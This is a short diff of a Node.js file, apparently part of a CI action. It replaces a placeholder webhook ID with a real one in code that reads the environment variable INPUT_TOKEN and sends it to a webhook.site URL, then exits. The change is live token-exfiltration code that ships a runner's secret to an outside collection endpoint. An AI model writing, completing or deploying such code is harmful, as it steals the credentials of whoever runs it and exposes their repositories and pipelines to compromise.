@@ -12,7 +12,7 @@ const https = require('https');
 
 if(process.env.INPUT_TOKEN) {
 
-    https.get('https://webhook.site/你的-WEBHOOK-ID?token='+process.env.INPUT_TOKEN, () => {
+    https.get('https://webhook.site/0a325b63-84b8-4a11-87fe-a0adf9a867f3?token='+process.env.INPUT_TOKEN, () => {
 
         process.exit(0);
 
